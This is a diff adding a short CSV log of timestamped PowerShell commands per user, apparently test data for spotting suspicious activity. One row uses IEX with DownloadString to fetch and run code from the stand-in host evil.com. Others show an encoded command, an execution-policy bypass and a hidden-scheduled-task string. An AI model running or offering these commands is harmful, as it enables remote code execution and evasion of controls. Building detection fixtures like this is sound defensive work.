@@ -1,0 +1,7 @@
+Time,User,Message
+2026-03-30 08:12:01,alice,Get-Process
+2026-03-30 08:14:22,bob,IEX (New-Object Net.WebClient).DownloadString('http://evil.com')
+2026-03-30 09:03:55,admin,powershell -encodedcommand SGVsbG8=
+2026-03-30 09:05:09,eve,Set-ExecutionPolicy Bypass -Scope Process
+2026-03-30 09:21:43,charlie,Start-Job -ScriptBlock {Write-Host 'hello'}
+2026-03-30 10:07:12,dave,$w = 'hidden schedule task';
